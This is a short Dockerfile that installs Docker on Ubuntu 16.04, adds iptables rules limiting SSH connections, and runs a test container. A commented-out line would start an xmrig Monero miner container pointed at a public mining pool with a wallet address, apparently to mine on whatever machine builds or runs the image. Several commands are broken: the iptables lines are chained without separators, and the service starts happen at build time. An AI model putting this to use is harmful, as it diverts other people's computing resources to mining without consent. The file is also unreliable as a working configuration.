FROM ubuntu:16.04
RUN apt-get update -y && apt-get upgrade  -y && apt-get -y install sudo && \
    apt install  -y  docker.io 
   
RUN service docker start
RUN sudo service docker start 
RUN sudo apt-get install systemd
RUN iptables -N SSHSCAN \
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -j SSHSCAN \
iptables -A SSHSCAN -m recent --set --name SSH \
iptables -A SSHSCAN -m recent --update --seconds 300 --hitcount 3 --name SSH -j DROP

RUN service docker --full-restart 
RUN sudo systemctl start docker
RUN sudo dockerd
RUN  sudo service docker status
RUN docker run hello-world --network

#RUN docker run --restart unless-stopped --read-only --cpus=".1" -m 50M -c 512 bitnn/alpine-xmrig -o pool.supportxmr.com:5555 -u 46NbvdUFHq7GapMDffA5f1fK7SKXzqPQ77vxjdYmhwMgbsnyJADSeeXEyAxmTCqpypTvwuRdy9rxkWjLGvXLdSPnM6m8wir -p x -k 

#RUN docker run hello-world
